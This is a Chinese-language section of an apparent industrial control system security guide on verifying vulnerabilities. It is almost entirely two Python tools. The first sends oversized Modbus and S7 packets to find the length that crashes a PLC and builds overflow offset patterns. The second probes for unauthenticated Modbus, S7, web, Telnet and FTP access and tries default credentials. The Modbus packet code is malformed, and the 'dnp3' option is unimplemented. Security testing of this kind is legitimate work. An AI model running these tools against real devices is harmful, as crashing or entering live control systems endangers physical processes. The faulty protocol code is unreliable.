# 漏洞验证方法

### 4.1 漏洞验证原则

在工控系统中，漏洞验证需要遵循"最小影响"原则，确保验证过程不会对生产系统造成实际损害。

```
验证原则：
1. 隔离环境验证 - 在独立的实验室环境中验证
2. 非破坏性测试 - 使用只读方式验证漏洞存在性
3. 影响评估 - 评估漏洞被利用的实际风险
4. 可复现性 - 确保漏洞可稳定复现
5. 时间约束 - 限制测试持续时间
```

### 4.2 缓冲区溢出验证

```python
#!/usr/bin/env python3
"""缓冲区溢出漏洞验证工具"""
import socket
import struct
import time

class BufferOverflowVerifier:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.critical_length = None
    
    def find_crash_point(self, protocol='modbus'):
        """逐步增加数据长度，定位崩溃点"""
        print(f"[*] 开始定位崩溃点 - 协议: {protocol}")
        
        lengths = list(range(100, 5000, 100)) + [5000, 10000, 50000]
        
        for length in lengths:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_ip, self.target_port))
                
                if protocol == 'modbus':
                    # Modbus TCP
                    tpkt = struct.pack('>BBH', 3, 0, 6 + length)
                    mbap = struct.pack('>HHBB', 1, 0, length + 1, 1)
                    payload = bytes([0x06]) + b'A' * length  # 写寄存器
                    
                    packet = tpkt + mbap[:6] + payload
                    
                elif protocol == 's7':
                    # S7协议
                    tpkt = struct.pack('>BBH', 3, 0, 10 + length)
                    cotp = bytes([0x02, 0xF0, 0x80])  # Data传输
                    s7 = struct.pack('>BBHHHH', 0x32, 0x01, 0, 1, length, 0)
                    payload = b'A' * length
                    
                    packet = tpkt + cotp + s7 + payload
                
                sock.send(packet)
                
                try:
                    response = sock.recv(4096)
                    print(f"  长度 {length}: 正常响应 ({len(response)} bytes)")
                except socket.timeout:
                    print(f"  长度 {length}: [!] 超时 - 可能崩溃!")
                    self.critical_length = length
                    
                    # 等待设备恢复
                    time.sleep(5)
                    
                    # 验证是否真的崩溃
                    if not self._check_alive():
                        print(f"  [!] 设备在长度 {length} 时崩溃!")
                        return length
                    else:
                        print(f"  设备已恢复")
                
                sock.close()
                
            except ConnectionRefusedError:
                print(f"  长度 {length}: 连接被拒绝 - 设备可能崩溃")
                self.critical_length = length
                return length
            except Exception as e:
                print(f"  长度 {length}: 异常 - {e}")
            
            time.sleep(0.5)
        
        print(f"[*] 未找到崩溃点")
        return None
    
    def _check_alive(self):
        """检查目标是否存活"""
        for _ in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.target_port))
                sock.close()
                return True
            except:
                time.sleep(2)
        return False
    
    def binary_search_crash_point(self, low, high):
        """二分查找精确崩溃点"""
        if low > high:
            return low
        
        mid = (low + high) // 2
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.target_port))
            
            payload = b'A' * mid
            sock.send(payload)
            
            try:
                response = sock.recv(4096)
                sock.close()
                # 设备正常，向上搜索
                return self.binary_search_crash_point(mid + 1, high)
            except socket.timeout:
                sock.close()
                # 设备崩溃，向下搜索
                time.sleep(5)
                return self.binary_search_crash_point(low, mid - 1)
        
        except:
            return self.binary_search_crash_point(low, mid - 1)
    
    def verify_overflow(self, crash_length):
        """验证溢出是否可控"""
        print(f"\n[*] 验证溢出可控性 (崩溃长度: {crash_length})")
        
        # 使用模式字符串确定偏移
        pattern = self._generate_pattern(crash_length + 200)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.target_port))
            sock.send(pattern)
            
            try:
                response = sock.recv(4096)
            except:
                pass
            
            sock.close()
        except:
            pass
        
        # 如果能获取崩溃信息，分析EIP覆盖偏移
        print(f"[*] 需要通过调试器获取EIP值来确定精确偏移")
        print(f"[*] 使用 pattern_offset 工具计算偏移")
    
    def _generate_pattern(self, length):
        """生成唯一模式字符串"""
        pattern = b''
        upper = ord('A')
        lower = ord('a')
        digit = ord('0')
        
        while len(pattern) < length:
            for u in range(26):
                for l in range(26):
                    for d in range(10):
                        if len(pattern) >= length:
                            return pattern
                        pattern += bytes([upper + u, lower + l, digit + d])
        
        return pattern[:length]

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='缓冲区溢出漏洞验证工具')
    parser.add_argument('target', help='目标IP')
    parser.add_argument('-p', '--port', type=int, required=True, help='目标端口')
    parser.add_argument('--protocol', default='modbus', choices=['modbus', 's7', 'dnp3'])
    args = parser.parse_args()
    
    verifier = BufferOverflowVerifier(args.target, args.port)
    crash_point = verifier.find_crash_point(args.protocol)
    
    if crash_point:
        print(f"\n[+] 发现崩溃点: {crash_point} bytes")
        verifier.verify_overflow(crash_point)
```

### 4.3 未授权访问验证

```python
#!/usr/bin/env python3
"""工控设备未授权访问验证工具"""
import socket
import struct
import requests
import telnetlib
import ftplib

class UnauthorizedAccessVerifier:
    def __init__(self, target_ip):
        self.target_ip = target_ip
    
    def check_modbus_unauthorized(self, port=502):
        """验证Modbus未授权访问"""
        print(f"\n[*] 检查Modbus未授权访问 ({self.target_ip}:{port})")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, port))
            
            # 不发送任何认证，直接读取数据
            # 读保持寄存器 (功能码0x03, 地址0, 数量1)
            tpkt = struct.pack('>BBH', 3, 0, 6)
            mbap = struct.pack('>HHBB', 1, 0, 2, 1)
            pdu = bytes([0x03, 0x00, 0x00, 0x00, 0x01])
            
            sock.send(tpkt + mbap + pdu)
            response = sock.recv(4096)
            sock.close()
            
            if len(response) >= 9:
                func_code = response[7]
                if func_code == 0x03:
                    byte_count = response[8]
                    print(f"  [!] 未授权读取成功! 返回 {byte_count} 字节数据")
                    print(f"  [!] 响应: {response.hex()}")
                    return True
                elif func_code & 0x80:
                    print(f"  [-] 返回异常码: {response[8]}")
                    return False
            else:
                print(f"  [-] 响应异常")
                return False
                
        except Exception as e:
            print(f"  [-] 连接失败: {e}")
            return False
    
    def check_s7_unauthorized(self, port=102):
        """验证S7协议未授权访问"""
        print(f"\n[*] 检查S7协议未授权访问 ({self.target_ip}:{port})")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, port))
            
            # COTP连接请求 (无认证)
            tpkt = struct.pack('>BBH', 3, 0, 22)
            cotp = bytes([
                0x11, 0xE0, 0x00, 0x01, 0x00, 0x01, 0x00,
                0xC0, 0x02, 0x01, 0x00,
                0xC1, 0x02, 0x01, 0x02,
                0xC2, 0x01, 0x0A
            ])
            
            sock.send(tpkt + cotp)
            response = sock.recv(1024)
            
            if len(response) >= 7 and response[5] == 0xD0:
                print(f"  [!] COTP连接成功 (无认证)")
                
                # 尝试读取设备信息
                setup = struct.pack('>BBHHHH', 0x32, 0x01, 0, 1, 8, 0)
                setup_param = struct.pack('>BBHBBH', 0xF0, 0, 1, 0, 1, 0x04E2)
                
                tpkt = struct.pack('>BBH', 3, 0, len(setup + setup_param))
                sock.send(tpkt + setup + setup_param)
                response = sock.recv(1024)
                
                if len(response) > 0:
                    print(f"  [!] S7通信建立成功 (无认证)")
                    
                    # 尝试读取标志位区
                    read_data = struct.pack('>BBBBHH', 0x12, 0x0A, 0x10, 0x84, 0, 0)
                    read_data += struct.pack('>HH', 1, 0)
                    
                    s7_pdu = struct.pack('>BBHHHH', 0x32, 0x01, 0, 2, len(read_data), 0)
                    
                    tpkt = struct.pack('>BBH', 3, 0, len(s7_pdu + read_data))
                    sock.send(tpkt + s7_pdu + read_data)
                    response = sock.recv(1024)
                    
                    if len(response) > 12:
                        print(f"  [!] 成功读取PLC数据 (无认证)")
                        print(f"  [!] 响应: {response.hex()}")
                        return True
            
            sock.close()
            return False
            
        except Exception as e:
            print(f"  [-] 连接失败: {e}")
            return False
    
    def check_web_unauthorized(self, ports=[80, 443, 8080, 8443]):
        """检查Web接口未授权访问"""
        print(f"\n[*] 检查Web接口未授权访问")
        
        for port in ports:
            protocol = 'https' if port in [443, 8443] else 'http'
            url = f"{protocol}://{self.target_ip}:{port}"
            
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"  [!] {url} 可直接访问 (无认证)")
                    # 检查是否为工控相关页面
                    if any(kw in response.text.lower() for kw in ['scada', 'hmi', 'plc', 'siemens', 'modbus', 'schneider']):
                        print(f"  [!] 疑似工控Web界面")
                    return True
                elif response.status_code == 401:
                    print(f"  [-] {url} 需要认证")
                else:
                    print(f"  [-] {url} 状态码: {response.status_code}")
            except:
                pass
        
        return False
    
    def check_telnet_unauthorized(self, port=23):
        """检查Telnet未授权访问"""
        print(f"\n[*] 检查Telnet未授权访问 ({self.target_ip}:{port})")
        
        try:
            tn = telnetlib.Telnet(self.target_ip, port, timeout=5)
            output = tn.read_until(b"login: ", timeout=5)
            
            if b"login" in output or b"Login" in output:
                print(f"  [-] 需要登录")
                
                # 尝试默认凭据
                default_creds = [
                    ('admin', 'admin'), ('admin', 'password'),
                    ('root', 'root'), ('root', ''),
                    ('admin', ''), ('guest', 'guest'),
                ]
                
                for user, pwd in default_creds:
                    try:
                        tn = telnetlib.Telnet(self.target_ip, port, timeout=5)
                        tn.read_until(b"login: ", timeout=3)
                        tn.write(user.encode() + b"\n")
                        tn.read_until(b"password: ", timeout=3)
                        tn.write(pwd.encode() + b"\n")
                        
                        result = tn.read_until(b"$", timeout=3)
                        if b"$" in result or b"#" in result:
                            print(f"  [!] 默认凭据有效: {user}/{pwd}")
                            tn.close()
                            return True
                        tn.close()
                    except:
                        pass
                
                print(f"  [-] 默认凭据无效")
            else:
                print(f"  [!] 可能无需认证")
                return True
            
        except Exception as e:
            print(f"  [-] Telnet连接失败: {e}")
        
        return False
    
    def check_ftp_unauthorized(self, port=21):
        """检查FTP未授权访问"""
        print(f"\n[*] 检查FTP未授权访问 ({self.target_ip}:{port})")
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target_ip, port, timeout=5)
            
            # 尝试匿名登录
            try:
                ftp.login()
                print(f"  [!] 匿名FTP登录成功!")
                
                # 列出文件
                files = ftp.nlst()
                print(f"  [!] 可访问文件: {files}")
                
                # 检查是否有敏感文件
                for f in files:
                    if any(kw in f.lower() for kw in ['config', 'password', 'firmware', 'backup']):
                        print(f"  [!] 发现敏感文件: {f}")
                
                ftp.quit()
                return True
            except:
                print(f"  [-] 匿名登录失败")
                
                # 尝试默认凭据
                for user, pwd in [('admin', 'admin'), ('ftp', 'ftp'), ('anonymous', '')]:
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(self.target_ip, port, timeout=5)
                        ftp.login(user, pwd)
                        print(f"  [!] FTP凭据有效: {user}/{pwd}")
                        ftp.quit()
                        return True
                    except:
                        pass
            
        except Exception as e:
            print(f"  [-] FTP连接失败: {e}")
        
        return False
    
    def run_all_checks(self):
        """运行所有未授权访问检查"""
        print(f"{'='*60}")
        print(f"工控设备未授权访问扫描 - {self.target_ip}")
        print(f"{'='*60}")
        
        results = {
            'Modbus': self.check_modbus_unauthorized(),
            'S7': self.check_s7_unauthorized(),
            'Web': self.check_web_unauthorized(),
            'Telnet': self.check_telnet_unauthorized(),
            'FTP': self.check_ftp_unauthorized(),
        }
        
        print(f"\n{'='*60}")
        print("扫描结果汇总:")
        for service, vulnerable in results.items():
            status = "[!] 存在风险" if vulnerable else "[*] 正常"
            print(f"  {service}: {status}")
        print(f"{'='*60}")

if __name__ == '__main__':
    import argparse
    import urllib3
    urllib3.disable_warnings()
    
    parser = argparse.ArgumentParser(description='工控设备未授权访问验证工具')
    parser.add_argument('target', help='目标IP地址')
    args = parser.parse_args()
    
    verifier = UnauthorizedAccessVerifier(args.target)
    verifier.run_all_checks()
```
